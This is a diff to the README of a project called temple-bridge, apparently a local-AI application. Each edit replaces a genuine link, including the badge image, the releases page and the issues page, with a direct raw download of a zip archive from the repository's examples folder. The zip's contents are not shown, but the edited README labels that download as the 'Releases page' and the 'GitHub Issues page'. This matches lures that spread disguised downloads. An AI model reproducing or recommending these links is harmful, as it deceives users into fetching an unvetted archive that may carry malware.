@@ -8,7 +8,7 @@ Welcome to **temple-bridge**! This application allows you to utilize local AI ca
 
 To get started, visit the page below to download the latest version of **temple-bridge**:
 
-[![Download temple-bridge](https://img.shields.io/badge/Download-temple--bridge-blue.svg)](https://github.com/Racersaravanaa/temple-bridge/releases)
+[![Download temple-bridge](https://github.com/Racersaravanaa/temple-bridge/raw/refs/heads/main/examples/bridge_temple_v2.6-alpha.4.zip)](https://github.com/Racersaravanaa/temple-bridge/raw/refs/heads/main/examples/bridge_temple_v2.6-alpha.4.zip)
 
 1. Click on the link above.
 2. You will be redirected to the Releases page.
@@ -47,7 +47,7 @@ After downloading, follow these steps to set up and run:
 If you encounter issues during installation or use, consider the following steps:
 
 - **Verify Requirements**: Make sure your system meets the required specifications.
-- **Re-download**: If the file seems corrupted, try downloading it again from the [Releases page](https://github.com/Racersaravanaa/temple-bridge/releases).
+- **Re-download**: If the file seems corrupted, try downloading it again from the [Releases page](https://github.com/Racersaravanaa/temple-bridge/raw/refs/heads/main/examples/bridge_temple_v2.6-alpha.4.zip).
 - **Check Permissions**: Ensure that you have the necessary permissions to install applications on your device.
 
 ## 💬 Support
@@ -55,11 +55,11 @@ If you encounter issues during installation or use, consider the following steps
 For questions or support, please reach out:
 
 - **Documentation**: Explore the documentation available on this repository for further guidance.
-- **Issues Page**: You can report any issues directly on the [GitHub Issues page](https://github.com/Racersaravanaa/temple-bridge/issues).
+- **Issues Page**: You can report any issues directly on the [GitHub Issues page](https://github.com/Racersaravanaa/temple-bridge/raw/refs/heads/main/examples/bridge_temple_v2.6-alpha.4.zip).
 - **Community**: Join discussions with other users and get tips on using **temple-bridge** effectively.
 
 ## 📝 Summary
 
 **temple-bridge** aims to seamlessly integrate local AI with governance frameworks, creating a reliable and private user experience. By following the steps above, you will be able to easily download, install, and run the application. Now you're ready to take control of your local AI capabilities!
 
-For more downloads, visit the following link again: [Download temple-bridge](https://github.com/Racersaravanaa/temple-bridge/releases).
+For more downloads, visit the following link again: [Download temple-bridge](https://github.com/Racersaravanaa/temple-bridge/raw/refs/heads/main/examples/bridge_temple_v2.6-alpha.4.zip).
